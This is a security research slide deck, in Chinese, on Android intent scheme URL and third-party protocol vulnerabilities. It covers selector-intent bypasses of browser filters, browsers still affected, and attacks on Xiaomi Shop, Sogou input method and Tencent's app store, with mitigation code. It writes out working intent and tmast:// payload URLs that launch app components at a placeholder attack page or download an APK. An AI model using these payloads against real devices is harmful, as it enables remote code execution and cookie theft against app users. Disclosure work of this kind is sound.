细数安卓APP那些远程攻击漏洞
z7sky & 行之 @360VulpeckerTeam
演讲者简介
weibo: @0xr0ot
@z7sky
z7sky & 行之
360VulpeckerTeam成员
研究方向：Android 系统安全和第三方APP 安全
概览
Mobile Pwn2Own 2013
Mobile Pwn2Own 2013上安全研究人员Pinkie Pie 利用chrome的两个0day漏洞，实现了远
程代码执行攻击，通过远程的web页面控制了系统。
随后,2014年日本安全研究人员Takeshi Terada 公布了Pwn2own 大赛exploit中intent协议漏
洞的利用方法。
影响面最大的远程攻击入口
意图协议和第三方协议
协议漏洞
Intent协议漏洞
Chrome v18及更早版本,可以通过为iframe的src属性设置自定义的scheme
实现从Web页面启动一个本地应用。其他android浏览器也支持。Chrome v25及
其之后，稍微有了些变化。取而代之的是通过自定义的scheme或者”intent:”来
实现。
Intent Scheme Url
如果浏览器支持intent scheme url，一般
会分三个步骤处理：
1.使用Intent.parseUri(uri);解析url生成
intent对象。
2.对intent对象进行过滤，不同的浏览器过
滤规则有差异。
3.通过Context#startActivityIfNeeded()或
Context#startActivity()等传递步骤2中经过
过滤后的intent来启动activity。
intent:mydata#Intent;action=com.me.om;S.url=file:///mnt/sdcard/Down
load/xss.html;SEL;component=com.ex.uritest/com.ex.uritest.MainActiv
ity;end
另外可以为其设置备用页面，当intent无法被解析或者外部应用不能被启
动时，用户会被重定向到指定页面。
S.browser_fallback_url=[encoded_full_url]
extra
data
selector  intent
设置了selector  intent 的activity
语法示例
BROWSABLE Category
在继续介绍前先了解两个概念。
1. android.intent.category.BROWSABLE
这个属性配置在AndroidManifest.xml文件中，如果应用组件支持这
个category，表明这个组件通过浏览器打开是安全的，不会对应用自身
产生危害。所以当自己的应用组件比较脆弱或者存在重要业务逻辑时，
一般建议禁止使用这个属性。
Selector Intent
2. Selector Intent
Android API level 15(Android 4.0.3) 引进了Selector intent机制，这个selector 
intent可以被绑定到一个main intent上，如果这个main intent拥有selector intent,那么
Android Framework会解析selector intent。
intent://appscan#Intent;S.url=file:///mnt/sdcard/Download/xss.html;SEL;component=com.
ex.uritest/com.ex.uritest.MainActivity;end
SEL表明为com.ex.uritest.MainActivity设置了一个selector intent,那么android 
framework会解析这个selector intent，即使com.ex.uritest.MainActivity没有
android.intent.category.BROWSABLE category。
利用SEL特性就可以绕过chrome的一些安全限制。
Intent intent = Intent.parseUri(uri);
intent.addCategory(“android.intent.category.BROWSABLE”);
intent.setComponent(null);
context.startActivityIfNeeded(intent, -1);
1.强制限制只有Category为android.intent.category.BROWSABLE的activity组件
才能接收它的intent。
2.禁止显式调用。
Chrome浏览器的绕过与防护
现在最新的chrome版本已经对selector intent增加了过滤规则.
攻击场景
利用这个漏洞,可以通过浏览器来攻击其他应用以及自身未导出组件。
Cookie Theft & UXSS 
案例：攻击自身组件
com.xiaomi.shop.activity.MainActivity能够被外部调用加载任意的网页。
案例：攻击第三方应用
intent:#Intent;component=com.xiaomi.shop/com.xiaomi.shop.activity.MainActivity;S.co
m.xiaomi.shop.extra_closed_url=http://server/acttack.html;end
1.小米手机远程代码执行漏洞
http://blogs.360.cn/360mobile/2014/08/25/miui-rce-vul/
防御：
如果可以使用其他方式实现同样的功能，应尽量避免使用addJavascriptInterface()。
可以通过移除系统接口和动态加载js的方式来防御漏洞的利用。
关于Webview RCE
详见
http://security.360.cn/Index/news/id/59.html
市面上仍受影响的浏览器
action
data
extra
component
BROWSABLE
sel
搜狗浏览器
支持
支持
支持
不支持
需要
支持
猎豹浏览器
支持
支持
支持
不支持
需要
支持
遨游云浏览器
支持
支持
支持
支持(支持显示调
用activity)
不需要
支持
2345浏览器
支持
支持
支持
不支持
需要
支持
欧朋浏览器
支持
支持
支持
支持
不需要
支持
海豚浏览器
支持
支持
支持
支持
不需要
支持
Mercury
支持
支持
支持
支持
不需要
支持
攻击案例(视频)
intent:#Intent;S.url=http://server/attack.html;SEL;
component=com.sohu.inputmethod.sogou/com.sogou.androidtool.WebPushActivity;
end
在安卓4.2以下系统上，搜狗输入法可能会受webview远程代码执行漏洞影响，猎豹浏
览器又可以通过SEL绕过防护。 以猎豹浏览器为跳板，进入搜狗输入法，利用远程代
码执行漏洞控制手机。
2.利用猎豹浏览器攻击搜狗输入法
自动检测及利用
使用Androguard搜索关键函数，parseUri()、loadUrl()、addJavascriptInterface()。
loadUrl可能会加载一个不安全的intent scheme url,另外这个应用还可能存在
webview远程代码执行漏洞，结合起来可以实现危害更大的攻击。
另外可以结合hook等手段实现自动化动态检测及利用。
我们可以通过hook监控intent的方式，来查看intent的哪些数据被发送出来了，
方便研究。
Hook Intent监测
// convert intent scheme URL to intent object Intent 
intent = Intent.parseUri(uri); 
// forbid launching activities without BROWSABLE category 
intent.addCategory("android.intent.category.BROWSABLE"); 
intent.setComponent(null); // forbid explicit call 
intent.setSelector(null); // forbid intent with selector intent 
context.startActivityIfNeeded(intent, -1); // start the activity by the intent 
通过以上分析，可以得出下面相对比较安全的intent filter方案。
漏洞缓解方案
毕竟安全本身就是不断的攻防对抗过程。
第三方协议漏洞
案例1:腾讯应用宝
tmast://download?downl_biz_id=qb&down_ticket=11&downl_url=https%3A%2f%2fwww.mw
rinfosecurity.com%2fsystem%2fassets%2f934%2foriginal%2fdrozer-agent-2.3.4.apk";